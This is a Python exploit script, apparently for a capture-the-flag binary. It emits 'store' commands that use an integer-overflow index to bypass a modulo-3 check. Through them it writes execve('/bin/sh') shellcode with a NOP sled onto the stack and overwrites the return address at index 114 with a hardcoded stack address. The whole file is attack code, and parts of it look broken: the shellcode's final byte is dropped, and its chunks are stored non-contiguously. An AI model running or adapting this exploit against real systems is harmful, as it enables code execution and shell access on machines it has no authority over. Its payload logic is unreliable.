#!/usr/bin/env python3

# Shellcode: 16 bytes NOP + 21 bytes execve("/bin/sh")
shellcode = b'\x90' * 16 + b'\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'

# Overflow base to bypass modulo 3 check
# 2^32 / 4 = 2^30 = 1073741824
OVERFLOW_BASE = 1073741824

# Buffer address (adjusted for runtime environment difference)
# GDB shows 0xffffd504, add 100 bytes offset for safety with NOP sled
BUFFER_ADDR = 4294956392  # 0xffffd568 (0xffffd504 + 100)

# RET is at index 114 from buffer start
RET_INDEX = 114

# Generate store commands for shellcode
commands = []

# Store shellcode in 4-byte chunks, skipping blocked indices
buffer_index = 0
for i in range(0, len(shellcode), 4):
    chunk = shellcode[i:i+4]
    if len(chunk) == 4:
        # Find next non-blocked index
        while (OVERFLOW_BASE + buffer_index) % 3 == 0:
            buffer_index += 1

        value = int.from_bytes(chunk, byteorder='little')
        overflow_index = OVERFLOW_BASE + buffer_index
        commands.append(f"store\n{value}\n{overflow_index}")
        buffer_index += 1

# Adjust buffer address to account for skipped indices
# We need to calculate where the shellcode actually starts
actual_shellcode_index = 0
while (OVERFLOW_BASE + actual_shellcode_index) % 3 == 0:
    actual_shellcode_index += 1

actual_buffer_addr = BUFFER_ADDR + (actual_shellcode_index * 4)

# Store return address pointing to shellcode location
ret_overflow_index = OVERFLOW_BASE + RET_INDEX
commands.append(f"store\n{actual_buffer_addr}\n{ret_overflow_index}")

# Quit to trigger return
commands.append("quit")

# Output all commands
print('\n'.join(commands))

